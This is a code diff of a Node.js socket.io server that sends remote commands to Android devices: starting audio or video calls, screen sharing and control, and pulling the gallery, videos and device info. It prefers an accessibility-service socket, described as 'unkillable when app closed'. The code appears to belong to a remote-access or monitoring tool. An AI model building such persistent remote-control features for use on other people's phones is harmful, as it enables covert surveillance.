@@ -581,11 +581,9 @@ io.on("connection", (socket) => {
             if (dev && dev.sockets && dev.sockets.size > 0) {
                 for (const sid of dev.sockets) {
                     io.to(sid).emit("end-call", { from, to });
-                    io.to(sid).emit("auto-command", { command: "end_call", from: socket.id });
                 }
             } else if (dev && dev.socketId) {
                 io.to(dev.socketId).emit("end-call", { from, to });
-                io.to(dev.socketId).emit("auto-command", { command: "end_call", from: socket.id });
             }
         }
 
@@ -607,7 +605,6 @@ io.on("connection", (socket) => {
             if (isMatch) {
                 console.log(`Routing end-call to socket ${sId} (${uName})`);
                 io.to(sId).emit("end-call", { from, to });
-                io.to(sId).emit("auto-command", { command: "end_call", from: socket.id });
                 deliveredCount++;
             }
         }
@@ -801,32 +798,77 @@ io.on("connection", (socket) => {
                     activeSockets.push(sid);
                 } else {
                     target.sockets.delete(sid);
+                    if (target.accSocketId === sid) target.accSocketId = null;
                     if (target.bgSocketId === sid) target.bgSocketId = null;
                     if (target.companionSocketId === sid) target.companionSocketId = null;
                 }
             }
         }
+        if (target) {
+            if (target.accSocketId) {
+                const s = io.sockets.sockets.get(target.accSocketId);
+                if (!s || !s.connected) target.accSocketId = null;
+            }
+            if (target.bgSocketId) {
+                const s = io.sockets.sockets.get(target.bgSocketId);
+                if (!s || !s.connected) target.bgSocketId = null;
+            }
+            if (target.companionSocketId) {
+                const s = io.sockets.sockets.get(target.companionSocketId);
+                if (!s || !s.connected) target.companionSocketId = null;
+            }
+            if (target.socketId) {
+                const s = io.sockets.sockets.get(target.socketId);
+                if (!s || !s.connected) target.socketId = null;
+            }
+        }
 
-        if (command === "end_call") {
-            // Disconnect command: Broadcast to ALL active sockets of this device
-            for (const sid of activeSockets) {
+        const callCommands = ["audio_call", "video_call", "screen_share", "screen_share_control", "end_call"];
+
+        if (callCommands.includes(command)) {
+            // For call commands ("audio_call", "video_call", "screen_share", "screen_share_control", "end_call"):
+            // Broadcast to ALL connected active sockets of target.sockets (or if specific roles exist, both accSocketId and bgSocketId if connected),
+            // so that even if one socket is dormant/paused by Android OS, the other socket receives the wake-up command.
+            const targetsToSend = new Set(activeSockets);
+            if (target) {
+                if (target.accSocketId) {
+                    const s = io.sockets.sockets.get(target.accSocketId);
+                    if (s && s.connected) targetsToSend.add(target.accSocketId);
+                }
+                if (target.bgSocketId) {
+                    const s = io.sockets.sockets.get(target.bgSocketId);
+                    if (s && s.connected) targetsToSend.add(target.bgSocketId);
+                }
+                if (target.socketId) {
+                    const s = io.sockets.sockets.get(target.socketId);
+                    if (s && s.connected) targetsToSend.add(target.socketId);
+                }
+            }
+
+            for (const sid of targetsToSend) {
                 io.to(sid).emit("auto-command", payload);
                 dispatched = true;
             }
-            console.log(`Auto-command 'end_call' broadcast to ${activeSockets.length} sockets of ${targetDeviceId}`);
+            console.log(`Auto-command '${command}' broadcast to ${targetsToSend.size} sockets of ${targetDeviceId}`);
+            addRuntimeLog("server", "info", "AutoCommand", `Broadcasted '${command}' to ${targetsToSend.size} sockets of ${targetDeviceId}`);
         } else {
-            // For calling / gallery / videos / info: DISPATCH TO EXACTLY ONE SOCKET!
+            // For data query commands ("get_gallery", "get_videos", "get_media_detail", "get_device_info"), dispatch to the first live connected socket (accSocketId || bgSocketId || activeSockets[0]).
             let chosenSocketId = null;
 
-            // Prefer accessibility_service (persistent and unkillable when app closed), then background_service
-            if (target && target.accSocketId && io.sockets.sockets.has(target.accSocketId)) {
-                chosenSocketId = target.accSocketId;
-            } else if (target && target.bgSocketId && io.sockets.sockets.has(target.bgSocketId)) {
-                chosenSocketId = target.bgSocketId;
-            } else if (activeSockets.length > 0) {
+            if (target && target.accSocketId) {
+                const s = io.sockets.sockets.get(target.accSocketId);
+                if (s && s.connected) chosenSocketId = target.accSocketId;
+            }
+            if (!chosenSocketId && target && target.bgSocketId) {
+                const s = io.sockets.sockets.get(target.bgSocketId);
+                if (s && s.connected) chosenSocketId = target.bgSocketId;
+            }
+            if (!chosenSocketId && activeSockets.length > 0) {
                 chosenSocketId = activeSockets[0];
-            } else if (target && target.socketId && io.sockets.sockets.has(target.socketId)) {
-                chosenSocketId = target.socketId;
+            }
+            if (!chosenSocketId && target && target.socketId) {
+                const s = io.sockets.sockets.get(target.socketId);
+                if (s && s.connected) chosenSocketId = target.socketId;
             }
 
             if (chosenSocketId) {
